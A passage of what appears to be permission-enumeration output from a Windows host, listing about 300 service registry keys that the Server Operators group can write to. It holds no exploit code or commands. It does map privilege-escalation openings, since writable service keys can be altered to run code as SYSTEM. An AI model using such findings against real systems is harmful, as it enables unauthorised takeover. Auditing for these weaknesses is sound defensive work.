    HKLM\system\currentcontrolset\services\ksthunk (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\KtmRm (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LanmanServer (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LanmanWorkstation (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ldap (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\lfsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LicenseManager (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\lltdio (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\lltdsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\lmhosts (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Lsa (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LSI_SAS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LSI_SAS2i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LSI_SAS3i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LSI_SSS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LSM (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\luafv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MapsBroker (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\megasas (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\megasas2i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\megasr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mlx4_bus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MMCSS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Modem (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\monitor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mouclass (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mouhid (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mountmgr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MpKslDrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mpsdrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MpsSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mrxsmb (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mrxsmb10 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mrxsmb20 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MsBridge (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSDTC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSDTC Bridge 4.0.0.0 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Msfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\msgpiowin32 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mshidkmdf (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mshidumdf (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\msisadrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSiSCSI (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\msiserver (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MsLbfoProvider (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MsLldp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MsRPC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSSCNTRS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mssmbios (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSSQLSERVER (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MTConfig (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Mup (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mvumis (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\napagent (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NcaSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NcbService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ndfltr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NDIS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NdisCap (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NdisImPlatform (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NdisTapi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Ndisuio (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NdisVirtualBus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NdisWan (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ndiswanlegacy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ndproxy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NetBIOS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NetbiosSmb (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Netlogon (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Netman (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\netprofm (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NetSetupSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NetTcpPortSharing (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\netvsc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\netvscvfpp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NgcCtnrSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NgcSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NlaSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Npfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\npsvctrig (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\nsi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\nsiproxy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NTFS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Null (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\nvraid (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\nvstor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\OneSyncSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\OneSyncSvc_4cbe7 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Parport (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\partmgr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PcaSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pciide (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pcmcia (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pcw (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pdc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PEAUTH (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\percsas2i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\percsas3i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PerfDisk (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PerfHost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PerfNet (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PerfOS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PerfProc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PhoneSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PimIndexMaintenanceSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PimIndexMaintenanceSvc_4cbe7 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pla (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PlugPlay (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PolicyAgent (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PortProxy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Power (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PptpMiniport (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PrintNotify (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Processor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ProfSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Psched (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pvscsi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ql2300i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ql40xx2i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\qlfcoei (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\QWAVE (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\QWAVEdrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RasAcd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RasAgileVpn (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RasGre (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Rasl2tp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RasPppoe (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RasSstp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\rdbss (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RDMANDK (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\rdpbus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RDPDR (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RDPNP (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RDPUDD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RdpVideoMiniport (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ReFS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ReFSv1 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RegFilter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RemoteRegistry (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RmSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ropennru (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RpcEptMapper (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RpcLocator (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RsFx0500 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RSoPProv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\rspndr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\s3cap (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sacdrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sacsvr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sbp2port (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SCardSvr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ScDeviceEnum (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\scfilter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Schedule (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\scmbus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\scmdisk0101 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SCPolicySvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sdbus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sdstor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\seclogon (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SENS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SensorDataService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SensorService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SensrSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SerCx (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SerCx2 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Serenum (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Serial (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sermouse (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SessionEnv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sfloppy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SharedAccess (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ShellHWDetection (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SiSRaid2 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SiSRaid4 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\smbdirect (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\smphost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SMSvcHost 4.0.0.0 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SNMP (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SNMPTRAP (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\spaceport (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SpbCx (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Spooler (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sppsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SQLBrowser (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SQLSERVERAGENT (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SQLTELEMETRY (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SQLWriter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\srv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\srv2 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\srvnet (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SSDPSRV (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SstpSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\StateRepository (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\stexstor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\stisvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\storahci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\storflt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\stornvme (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\storqosflt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\StorSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\storufs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\storvsc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\svga_wddm (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\svsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\swenum (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\swprv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Synth3dVsc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SysMain (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SystemEventsBroker (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TabletInputService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TapiSrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TCPIP6TUNNEL (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\tcpipreg (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TCPIPTUNNEL (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\tdx (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\terminpt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TermService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Themes (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TieringEngineService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\tiledatamodelsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TimeBrokerSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TPM (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TSDDD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TsUsbFlt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TsUsbGD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\tsusbhub (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\tunnel (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\tzautoupdate (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UALSVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UASPStor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UcmCx0101 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UcmTcpciCx0101 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UcmUcsi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Ucx01000 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UdeCx (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\udfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UEFI (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UevAgentDriver (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UevAgentService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Ufx01000 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UfxChipidea (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ufxsynopsys (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UGatherer (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UGTHRSVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UI0Detect (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\umbus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UmPass (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UmRdpService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UnistoreSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UnistoreSvc_4cbe7 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\upnphost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UrsChipidea (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UrsCx01000 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UrsSynopsys (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbccgp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbehci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbhub (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\USBHUB3 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbohci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbprint (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbser (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\USBSTOR (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbuhci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\USBXHCI (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UserDataSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UserDataSvc_4cbe7 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UserManager (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UsoSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VaultSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vdrvroot (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vds (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VerifierExt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VGAuthService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vhdmp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vhf (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vm3dmp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vm3dmp-debug (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vm3dmp-stats (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vm3dmp_loader (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vm3dservice (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmbus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VMBusHID (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmgid (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmicguestinterface (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmicheartbeat (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmickvpexchange (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmicrdv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmicshutdown (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmictimesync (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmicvmsession (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmicvss (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VMMemCtl (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmmouse (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmusbmouse (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmvss (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmwefifw (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmxnet3 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmxnet3ndis6 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\volmgr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\volmgrx (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\volsnap (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\volume (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vpci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vsmraid (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vsock (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vsockDll (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vsockSys (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VSS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VSTXRAID (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vwifibus (Server Operators [Allow: WriteKey GenericWrite])
